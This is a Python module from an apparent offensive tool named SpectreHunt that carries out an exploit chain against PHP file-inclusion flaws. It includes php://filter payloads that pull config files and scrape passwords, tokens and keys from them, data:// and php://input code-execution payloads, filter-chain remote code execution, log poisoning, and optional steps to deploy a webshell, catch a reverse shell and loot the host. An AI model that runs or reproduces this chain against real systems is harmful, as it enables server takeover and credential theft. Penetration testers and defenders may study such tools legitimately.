"""
SpectreHunt :: core/chain.py
Exploit chaining. This module EXECUTES the ladder, it does not describe it.

Order is by cost, cheapest first:
  1. php://filter source disclosure  -> credentials, zero prereqs
  2. data://                         -> code exec (needs allow_url_include)
  3. php://input                     -> code exec via POST body
  4. php://filter CHAIN              -> arbitrary code exec, zero writes
  5. log / environ / session poison  -> code exec, no wrappers needed
  6. webshell / reverse shell / loot -> land on the box (opt-in)

Author : Inayat Hussain
"""

from __future__ import annotations

from config import CHAIN_MARKER, PHP_EXEC, log
from core import filterchain
from core.poison import Poisoner
from core.shell import ShellManager

SECRET_HINTS = ("password", "passwd", "secret", "db_", "api_key", "token",
                "aws_", "mysql", "smtp", "auth", "key")

SOURCE_RESOURCES = ("index.php", "index", "config.php", "../config.php",
                    "app/config.php", "settings.php", "wp-config.php", ".env")
CODE_RESOURCES = ("index.php", "index", "index.html")


class ExploitChainer:
    def __init__(self, fuzzer, lhost=None, lport=0, shell_timeout=12):
        self.fz = fuzzer
        self.shell = ShellManager(fuzzer, lhost, lport, shell_timeout)
        self.poisoner = Poisoner(fuzzer)

    def _fire(self, finding, payload):
        return self.fz.request(finding.url, finding.param, payload, finding.method)

    def _source_disclosure(self, finding) -> dict:
        from core.fuzzer import _try_base64

        for resource in SOURCE_RESOURCES:
            payload = "php://filter/convert.base64-encode/resource=" + resource
            decoded = _try_base64(self._fire(finding, payload) or "")
            if not decoded or len(decoded) < 20:
                continue
            if resource.endswith(".php") and "<?" not in decoded:
                continue
            secrets = [ln.strip() for ln in decoded.splitlines()
                       if any(h in ln.lower() for h in SECRET_HINTS)
                       and 4 < len(ln.strip()) < 200][:6]
            detail = f"recovered {len(decoded)} bytes of {resource}"
            if secrets:
                detail += " | " + " ; ".join(secrets[:3])
            return {"step": "php://filter source disclosure", "status": "CONFIRMED",
                    "payload": payload, "detail": detail, "secrets": secrets}

        return {"step": "php://filter source disclosure", "status": "FAILED",
                "payload": SOURCE_RESOURCES[0], "detail": "no source recovered"}

    def _data_wrapper(self, finding) -> dict:
        from core.encoder import base64_encode

        payload = "data://text/plain;base64," + base64_encode(PHP_EXEC)
        for variant in (payload, payload + "?", payload + "%00"):
            body = self._fire(finding, variant)
            if body and CHAIN_MARKER in body:
                return {"step": "data:// code execution", "status": "CONFIRMED",
                        "payload": variant, "detail": "allow_url_include=On"}
        return {"step": "data:// code execution", "status": "FAILED",
                "payload": payload, "detail": "allow_url_include Off or filtered"}

    def _input_wrapper(self, finding) -> dict:
        from utils.parser import set_param

        target = set_param(finding.url, finding.param, "php://input")
        try:
            resp = self.fz.session.post(target, data=PHP_EXEC, timeout=self.fz.timeout)
            if resp is not None and CHAIN_MARKER in resp.text:
                return {"step": "php://input code execution", "status": "CONFIRMED",
                        "payload": "php://input", "detail": "POST body executed as PHP"}
        except Exception:
            pass
        return {"step": "php://input code execution", "status": "FAILED",
                "payload": "php://input", "detail": "needs allow_url_include + POST"}

    def _filter_chain(self, finding) -> dict:
        best = ""
        for resource in CODE_RESOURCES:
            payload = filterchain.build(PHP_EXEC, resource)
            best = best or payload
            body = self._fire(finding, payload)
            if body and CHAIN_MARKER in body:
                return {"step": "php://filter chain RCE", "status": "CONFIRMED",
                        "payload": payload,
                        "detail": f"chain {len(payload)} bytes -- code exec, zero writes"}
        return {"step": "php://filter chain RCE", "status": "FAILED", "payload": best,
                "detail": f"chain {len(best)} bytes -- if >8000, POST it instead"}

    def _poison(self, finding) -> list:
        return [{"step": s["vector"], "status": s["status"],
                 "payload": s["payload"], "detail": s["detail"]}
                for s in self.poisoner.poison(finding)]

    @staticmethod
    def _shell_hint() -> dict:
        return {"step": "manual shell (no flags set)", "status": "INFO", "payload": "",
                "detail": "re-run with --deploy-webshell / --shell / --loot"}

    def chain(self, finding, do_shell=False, do_webshell=False,
              do_poison=False, do_loot=False, do_filter=False) -> list:
        steps = []
        exec_confirmed = False

        if finding.vtype in ("lfi", "traversal"):
            steps.append(self._source_disclosure(finding))
            steps.append(self._data_wrapper(finding))
            steps.append(self._input_wrapper(finding))
            exec_confirmed = any(s["status"] == "CONFIRMED" for s in steps[1:])

            if not exec_confirmed or do_filter:
                fc = self._filter_chain(finding)
                steps.append(fc)
                exec_confirmed = exec_confirmed or fc["status"] == "CONFIRMED"

            if not exec_confirmed and do_poison:
                poison_steps = self._poison(finding)
                steps.extend(poison_steps)
                exec_confirmed = any(s["status"] == "CONFIRMED" for s in poison_steps)

        if finding.vtype in ("rce", "rfi"):
            exec_confirmed = True

        if exec_confirmed and (do_shell or do_webshell or do_loot):
            if do_webshell:
                r = self.shell.deploy_webshell(finding)
                steps.append({"step": "webshell deployment", "status": r["status"],
                              "payload": r.get("url", ""), "detail": r["detail"]})
            if do_shell:
                r = self.shell.catch(finding)
                steps.append({"step": "reverse shell", "status": r["status"],
                              "payload": r.get("payload", ""), "detail": r["detail"]})
            if do_loot:
                log("[LOOT]", "enumerating the box")
                for cmd, out in self.shell.loot(finding):
                    steps.append({"step": "loot", "status": "INFO",
                                  "payload": cmd, "detail": out[:300]})
        elif exec_confirmed:
            steps.append(self._shell_hint())

        return steps
